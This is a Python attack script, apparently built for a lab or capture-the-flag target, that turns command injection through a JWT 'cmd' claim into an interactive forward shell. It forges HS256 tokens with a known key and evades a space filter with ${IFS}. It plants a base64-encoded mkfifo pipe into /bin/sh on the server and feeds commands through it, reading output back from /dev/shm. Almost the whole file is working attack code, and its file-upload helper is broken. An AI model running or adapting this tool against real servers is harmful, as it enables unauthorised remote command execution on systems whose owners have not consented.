from os import urandom
import jwt
import sys
import time
import base64
import requests
import hashlib
import threading

bold = "\033[1m"
green = "\033[32m"
white = "\033[37m"
purple = "\033[95m"
red = "\033[91m"
blue = "\033[34m"
orange = "\033[33m"
end = "\033[0m"

class forward_shell:
	# Setting the default JWT Default Algorithm to HS256
	jwt_algo = "HS256"
	# Class output variable to know which commands provide outputs and which do not
	Output = False

	# Giving birth to the url from the IP ,PORT ,JWT_PRIVATE_KEY feed into the constructor
	def __init__(self,ip,port,jwt_private_key):
		self.ip = ip
		self.port = port
		self.url = "http://" + self.ip + ":" + str(self.port) + "/"
		self.jwt_key = jwt_private_key

		# Generating a random session token of 5 characters
		self.session = hashlib.md5(urandom(10)).hexdigest()[0:5]
		self.rce_jwt_token = ""

		# Creating a mkfifo input pipe
		self.ip_file = f"/dev/shm/ip_{self.session}"
		# The command output file which would contain the output of the commands in the input pipe
		self.op_file = f"/dev/shm/op_{self.session}"

	# Function to test the connection with the server
	def test_connection(self):
		print(f"{bold}{blue}[*] {white}Trying to Access {self.url}")
		try:
			# Attempting to connect to the webserver and wait 3 seconds maximum for the response
			request = requests.get(self.url, timeout=3)
			print(f"{bold}{green}[+] {white}Connection Established with {self.url}")

		# Printing an error message if the website is unreachable
		except (requests.ConnectionError, requests.Timeout) as exception:
			print(f"{bold}{red}[-] Sorry, But I couldn't reach that...")
	
	# This function takes a command and crafts a JWT Token and stores into a class variable
	def craft_jwt(self,jwt_algo="HS256",cmd="whoami"):

		# Replacing the spaces in the command with ${IFS} to bypass the space filter
		space_escaped_cmd = cmd.replace(" ","${IFS}",-1)

		# Crafting the JWT with spaces in the command replaced with ${IFS}
		self.rce_jwt_token = jwt.encode({"cmd": space_escaped_cmd}, self.jwt_key, algorithm=jwt_algo)
	
	# Create the mkfifo pipe of an pseudo file which would pipe any lines in the file and execute it and send the output into the file
	def create_mkfifo_pipe(self):
		self.Output = False
		mkfifo_pipe = f"mkfifo {self.ip_file}; tail -f {self.ip_file} | /bin/sh 2>&1 > {self.op_file}"
		b64_mkfifo_pipe = base64.b64encode(mkfifo_pipe.encode('utf-8')).decode('utf-8')
		final_b64_mkfifo_cmd = f"echo {b64_mkfifo_pipe}|base64 -d|sh"
		print(f"{bold}{green}[+] {white}Spawning new session {self.session}")
		self.craft_jwt(cmd=final_b64_mkfifo_cmd)

		print(f"{bold}{blue}[*] {white}Switching to Interactive Mode\n")

		# Creating mkfifo pipes hangs the web request forever
		# Therefore, Making it as a thread so, that the program does not hang 
		thread = threading.Thread(target=self.send_command, args=())
		thread.daemon = True
		thread.start()
	
	# Create the command to base64 encoding and prepare it to be sent to the mkfifo pipe
	def send_command_mkfifo(self,cmd="whoami"):
		# Sending a command into the mkfifo pipe
		# This sending process would not return any command output
		self.Output = False
		# Base64 encoding the command
		b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
		# Sending the command in the format of echo base64cmd|base64 -d|sh
		stage_cmd =  f"echo {b64cmd}|base64 -d>{self.ip_file}"
		self.craft_jwt(cmd=stage_cmd)
		self.send_command()

	# Read the output from the mkfifo pipe
	def read_command_mkfifo_output(self):
		# Read the output session file in /dev/shm/
		self.Output = True
		get_output_cmd = f"/bin/cat {self.op_file}"
		self.craft_jwt(cmd=get_output_cmd)
		self.send_command()
		self.clear_output_buffer()

	# Clear the output file, Or else we would get all command outputs
	def clear_output_buffer(self):
		# Clear the command outputs
		# Does not return any command output
		self.Output = False
		clear_cmd = f"echo -n \"\">{self.op_file}"
		self.craft_jwt(cmd=clear_cmd)
		self.send_command()


	def upload_file(self,input_file,output_file):
		with open("input_file","r") as file:
			b64_file = base64.b64encode(file.read())

	# Send the JWT token to the web endpoint as a GET Request
	def send_command(self):
		headers = { "Authorization" : f"Bearer {self.rce_jwt_token}"}
		proxies = { "http" : "http://127.0.0.1:8080"}
		r = requests.get(self.url,headers=headers)
		# Checking if the command returns any output
		if self.Output:
			print(f"{end}{bold}",end="")
			# If the commmand returns empty string don't show an empty line
			if r.text.rstrip() != "":
				print(r.text.rstrip())


if __name__ == '__main__':

	key = "The JWT HS256 Key"

	# Taking the IP and Port as Input
	#IP = input(f"{bold}{green} RHOST : {end}")
	#PORT = int(input(f"{bold}{green} RPORT : {end}"))
	
	IP = "192.168.1.189"
	PORT = 3000

	# Creating a new object with the IP and PORT as entered by user
	fs = forward_shell(IP,PORT,key)

	# Test's whether the webserver is available or not
	fs.test_connection()

	# Create a mkfifo command line bridgefile
	fs.create_mkfifo_pipe()

	while True:
		cmd = input(f"{bold}{green}Xyan1d3> {orange}")
		fs.send_command_mkfifo(cmd=cmd)
		fs.read_command_mkfifo_output()